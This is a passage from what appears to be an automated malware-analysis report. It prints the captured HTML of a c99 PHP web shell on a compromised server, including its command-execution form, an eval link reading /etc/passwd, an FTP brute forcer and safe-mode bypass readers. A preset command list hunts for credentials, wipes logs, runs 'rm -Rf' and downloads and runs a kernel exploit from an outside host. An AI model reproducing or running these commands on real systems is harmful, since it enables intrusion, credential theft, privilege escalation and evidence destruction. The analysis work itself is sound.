bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fhome%2F&sort=0a\"><b>home/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2F&sort=0a\"><b>chsclair/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2F&sort=0a\"><b>public_html/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F&sort=0a\"><b>thickbox/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwxr-xr-x</font></b><br><b>Free 240.23 GB of 389.31 GB (61.71%)</b><br><b>Your ip: <a href=http://87.177.180.196>87.177.180.196</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[js]&nbsp;jquery-latest.js (93.62 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=green>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=jquery-latest.js&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b><u>[hex]</u></b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=info&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=html&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=html&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=txt&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><font color=green>[txt]</font></a> (<a href=\"?act=f&f=jquery-latest.js&ft=txt&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=code&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=code&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=phpsess&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=phpsess&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=exe&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=exe&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=sdb&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=sdb&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=img&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=img&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=ini&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=ini&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=download&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=download&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=notepad&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=notepad&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=edit&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=edit&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> /home/chsclair/public_html/thickbox/jquery-latest.js</td></tr><tr><td><b>Size</b></td><td> 93.62 KB</td></tr><tr><td><b>MD5</b></td><td> 807aac0afa686d7558985eb4840af075</td></tr><tr><td><b>Owner/Group</b></td><td> chsclair/chsclair<tr><td><b>Perms</b></td><td><a href=\"?act=chmod&f=jquery-latest.js&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><font color=green>-rw-r--r--</font></a></td></tr><tr><td><b>Create time</b></td><td> 26/01/2011 08:25:58</td></tr><tr><td><b>Access time</b></td><td> 07/06/2011 01:36:12</td></tr><tr><td><b>MODIFY time</b></td><td> 04/03/2010 17:21:10</td></tr></table><br><b>HEXDUMP PREVIEW</b><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>00000000<br>00000018<br>00000030<br>00000048<br>00000060<br>00000078<br>00000090<br>000000A8<br></td><td bgcolor=000000>28 66 75 6E 63 74 69 6F 6E 28 29 7B 0A 2F 2A 0A 20 2A 20 6A 51 75 65 72 <br>79 20 31 2E 32 2E 33 61 20 2D 20 4E 65 77 20 57 61 76 65 20 4A 61 76 61 <br>73 63 72 69 70 74 0A 20 2A 0A 20 2A 20 43 6F 70 79 72 69 67 68 74 20 28 <br>63 29 20 32 30 30 37 20 4A 6F 68 6E 20 52 65 73 69 67 20 28 6A 71 75 65 <br>72 79 2E 63 6F 6D 29 0A 20 2A 20 44 75 61 6C 20 6C 69 63 65 6E 73 65 64 <br>20 75 6E 64 65 72 20 74 68 65 20 4D 49 54 20 28 4D 49 54 2D 4C 49 43 45 <br>4E 53 45 2E 74 78 74 29 0A 20 2A 20 61 6E 64 20 47 50 4C 20 28 47 50 4C <br>2D 4C 49 43 45 4E 53 45 2E 74 78 74 29 20 6C 69 63 65 6E 73 65 73 2E 0A <br></td><td bgcolor=000000>(function(){&nbsp;/*&nbsp;&nbsp;*&nbsp;jQuer<br>y&nbsp;1.2.3a&nbsp;-&nbsp;New&nbsp;Wave&nbsp;Java<br>script&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;Copyright&nbsp;(<br>c)&nbsp;2007&nbsp;John&nbsp;Resig&nbsp;(jque<br>ry.com)&nbsp;&nbsp;*&nbsp;Dual&nbsp;licensed<br>&nbsp;under&nbsp;the&nbsp;MIT&nbsp;(MIT-LICE<br>NSE.txt)&nbsp;&nbsp;*&nbsp;and&nbsp;GPL&nbsp;(GPL<br>-LICENSE.txt)&nbsp;licenses.&nbsp;<br></td></tr></table><br><b>Base64 Encode</b><br><textarea cols=80 rows=10></textarea><br><br><b>HEXDUMP:</b><nobr> [<a href=\"?act=f&f=jquery-latest.js&ft=info&fullhexdump=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Full</a>] [<a href=\"?act=f&f=jquery-latest.js&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Preview</a>]<br><b>Base64: </b>",
            "<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Encode</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=2&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">+chunk</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=3&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">+chunk+quotes</a>]&nbsp;</nobr>",
            "<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=4&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Decode</a>]&nbsp;</nobr>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=green>[ ok ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0157 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [],
        "url": [
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://google.com/search",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c"
        ]
    },
    "time": "0:00:14.667424",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
